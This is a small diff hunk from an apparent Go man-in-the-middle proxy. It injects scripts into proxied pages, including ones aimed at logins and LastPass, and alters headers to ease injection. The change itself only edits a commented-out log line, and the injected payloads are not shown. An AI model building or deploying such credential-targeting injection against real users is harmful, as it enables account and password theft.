@@ -135,7 +135,7 @@ func utilsProcessInjectionScripts(ctx *goproxy.ProxyCtx, body string ) string {
                 body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOGIN_RESULT )
             }
             if globalInjectLastpass {
-                // log.Println("INJECTING Lastpass")
+                // log.Println("INJECTING lLastpass")
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LASTPASS_RESULT )
             }
